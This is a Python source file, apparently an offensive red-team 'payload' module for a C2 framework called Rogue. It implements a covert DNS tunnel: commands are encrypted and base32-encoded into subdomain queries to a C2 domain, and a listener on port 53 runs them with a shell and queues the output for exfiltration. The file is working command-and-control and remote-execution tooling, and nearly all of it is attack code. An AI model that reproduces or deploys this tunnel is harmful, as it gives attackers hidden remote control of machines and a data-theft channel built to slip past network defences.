#!/usr/bin/env python3
"""
PAYLOAD: DNS Tunneling Module
DESCRIPTION: Creates covert channel using DNS queries
AUTHOR: Rogue Red Team
VERSION: 2.0
"""
import dns.resolver, dns.query, dns.message, base64, time, threading, queue
import socket, struct, json, datetime, os, sys, hashlib, random, string
from Cryptodome.Cipher import AES

class DNSTunnel:
    def __init__(self, domain="rogue-c2.example.com", mode="client", 
                 listen_ip="0.0.0.0", listen_port=53, upstream_dns="8.8.8.8"):
        self.domain = domain
        self.mode = mode  # "client" or "server"
        self.listen_ip = listen_ip
        self.listen_port = listen_port
        self.upstream_dns = upstream_dns
        self.encryption_key = hashlib.sha256(b'RogueDNSTunnel2024').digest()
        
        self.command_queue = queue.Queue()
        self.response_queue = queue.Queue()
        self.running = False
        
        self.output_dir = os.path.expanduser("~/.cache/.rogue/dns_tunnel")
        os.makedirs(self.output_dir, exist_ok=True)
    
    def encode_data(self, data):
        """Encode data for DNS subdomain"""
        # Encrypt then base32 encode (base32 is DNS-safe)
        cipher = AES.new(self.encryption_key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data.encode())
        encrypted = cipher.nonce + tag + ciphertext
        
        # Base32 encode for DNS compatibility
        encoded = base64.b32encode(encrypted).decode().rstrip('=')
        
        # Split into DNS label chunks (max 63 chars per label)
        chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
        return chunks
    
    def decode_data(self, encoded_data):
        """Decode data from DNS subdomain"""
        try:
            # Reconstruct base32 string
            encoded = encoded_data.upper()
            # Add padding if needed
            padding = (8 - len(encoded) % 8) % 8
            encoded += '=' * padding
            
            # Decode base32
            encrypted = base64.b32decode(encoded)
            
            # Decrypt
            nonce, tag, ciphertext = encrypted[:16], encrypted[16:32], encrypted[32:]
            cipher = AES.new(self.encryption_key, AES.MODE_EAX, nonce)
            data = cipher.decrypt_and_verify(ciphertext, tag)
            
            return data.decode()
        except Exception as e:
            print(f"[!] Decode error: {e}")
            return None
    
    def send_command(self, command):
        """Send command via DNS tunnel (client side)"""
        try:
            # Encode command
            chunks = self.encode_data(json.dumps({
                "type": "command",
                "command": command,
                "timestamp": datetime.datetime.now().isoformat(),
                "id": hashlib.md5(command.encode()).hexdigest()[:8]
            }))
            
            # Build domain name
            domain_parts = []
            for chunk in chunks:
                domain_parts.append(chunk)
            
            domain_parts.append(self.domain)
            query_domain = '.'.join(domain_parts)
            
            # Send DNS query (TXT record request)
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [self.upstream_dns]
            
            try:
                response = resolver.resolve(query_domain, 'TXT')
                # Extract response from TXT records
                txt_data = []
                for rdata in response:
                    for txt_string in rdata.strings:
                        txt_data.append(txt_string.decode())
                
                response_text = ''.join(txt_data)
                decoded_response = self.decode_data(response_text)
                
                if decoded_response:
                    response_data = json.loads(decoded_response)
                    return response_data.get("response", "No response")
                
            except dns.resolver.NXDOMAIN:
                return "NXDOMAIN - No such domain"
            except dns.resolver.NoAnswer:
                return "No answer from DNS"
            except Exception as e:
                return f"DNS query error: {e}"
            
        except Exception as e:
            return f"[!] Send command error: {e}"
    
    def dns_server(self):
        """Run DNS server for receiving commands"""
        try:
            # Create UDP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.bind((self.listen_ip, self.listen_port))
            
            print(f"[+] DNS server listening on {self.listen_ip}:{self.listen_port}")
            
            while self.running:
                try:
                    data, addr = sock.recvfrom(512)
                    
                    # Parse DNS query
                    request = dns.message.from_wire(data)
                    
                    # Process each question
                    for question in request.question:
                        qname = question.name.to_text()
                        
                        # Check if it's for our domain
                        if self.domain in qname:
                            print(f"[DNS] Query from {addr[0]}: {qname}")
                            
                            # Extract encoded data from subdomain
                            subdomain = qname.replace(f'.{self.domain}', '')
                            
                            # Try to decode command
                            decoded = self.decode_data(subdomain)
                            if decoded:
                                try:
                                    command_data = json.loads(decoded)
                                    if command_data.get("type") == "command":
                                        # Put command in queue for processing
                                        self.command_queue.put({
                                            "command": command_data.get("command"),
                                            "client": addr[0],
                                            "timestamp": command_data.get("timestamp")
                                        })
                                        
                                        # Create response
                                        response_data = {
                                            "type": "response",
                                            "status": "received",
                                            "timestamp": datetime.datetime.now().isoformat()
                                        }
                                        
                                        # Encode response
                                        response_encoded = self.encode_data(json.dumps(response_data))
                                        response_txt = ''.join(response_encoded)
                                        
                                        # Build DNS response
                                        response = dns.message.make_response(request)
                                        answer = dns.rrset.from_text(
                                            question.name,
                                            300,  # TTL
                                            'IN', 'TXT',
                                            f'"{response_txt}"'
                                        )
                                        response.answer.append(answer)
                                        
                                        # Send response
                                        sock.sendto(response.to_wire(), addr)
                                        
                                except json.JSONDecodeError:
                                    pass
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"[!] DNS server error: {e}")
                    
        except Exception as e:
            print(f"[!] DNS server failed: {e}")
    
    def command_handler(self):
        """Handle incoming commands"""
        while self.running:
            try:
                command_data = self.command_queue.get(timeout=1)
                if command_data:
                    print(f"[+] Received command: {command_data['command']}")
                    
                    # Execute command
                    import subprocess
                    try:
                        result = subprocess.check_output(
                            command_data['command'],
                            shell=True,
                            stderr=subprocess.STDOUT,
                            timeout=30
                        ).decode()
                    except subprocess.CalledProcessError as e:
                        result = e.output.decode()
                    except subprocess.TimeoutExpired:
                        result = "Command timed out after 30 seconds"
                    
                    # Store result for later exfiltration
                    self.response_queue.put({
                        "command": command_data['command'],
                        "result": result,
                        "client": command_data['client'],
                        "timestamp": command_data['timestamp']
                    })
                    
            except queue.Empty:
                continue
            except Exception as e:
                print(f"[!] Command handler error: {e}")
    
    def start_server(self):
        """Start DNS tunnel server"""
        print(f"[+] Starting DNS tunnel server for domain: {self.domain}")
        self.running = True
        
        # Start DNS server thread
        dns_thread = threading.Thread(target=self.dns_server, daemon=True)
        dns_thread.start()
        
        # Start command handler thread
        handler_thread = threading.Thread(target=self.command_handler, daemon=True)
        handler_thread.start()
        
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            print("[+] Stopping DNS tunnel server...")
        finally:
            self.stop()
    
    def start_client(self, command=None):
        """Start DNS tunnel client"""
        if command:
            # Send single command
            print(f"[+] Sending command via DNS: {command}")
            response = self.send_command(command)
            print(f"[+] Response: {response}")
            return response
        else:
            # Interactive mode
            print(f"[+] Starting DNS tunnel client to domain: {self.domain}")
            print("[+] Enter commands to send via DNS (or 'exit' to quit)")
            
            while True:
                try:
                    command = input("DNS> ").strip()
                    if command.lower() in ['exit', 'quit']:
                        break
                    
                    if command:
                        response = self.send_command(command)
                        print(f"[+] Response: {response}")
                        
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    print(f"[!] Error: {e}")
    
    def stop(self):
        """Stop DNS tunnel"""
        self.running = False
    
    def execute(self, mode=None, command=None):
        """Execute DNS tunnel based on mode"""
        mode = mode or self.mode
        
        if mode == "server":
            self.start_server()
            return "[+] DNS tunnel server started"
        elif mode == "client":
            result = self.start_client(command)
            return json.dumps({"command": command, "response": result}, indent=2)
        else:
            return f"[!] Unknown mode: {mode}"

def rogue_integration():
    """Wrapper for Rogue C2 integration"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Rogue DNS Tunnel')
    parser.add_argument('--mode', choices=['client', 'server'], default='client', help='Tunnel mode')
    parser.add_argument('--domain', default='rogue-c2.example.com', help='Domain for DNS tunnel')
    parser.add_argument('--command', help='Command to execute (client mode only)')
    parser.add_argument('--listen-ip', default='0.0.0.0', help='Listen IP (server mode)')
    parser.add_argument('--listen-port', type=int, default=53, help='Listen port (server mode)')
    parser.add_argument('--upstream-dns', default='8.8.8.8', help='Upstream DNS server (client mode)')
    
    args, unknown = parser.parse_known_args()
    
    tunnel = DNSTunnel(
        domain=args.domain,
        mode=args.mode,
        listen_ip=args.listen_ip,
        listen_port=args.listen_port,
        upstream_dns=args.upstream_dns
    )
    
    return tunnel.execute(mode=args.mode, command=args.command)

if __name__ == "__main__":
    print(rogue_integration())
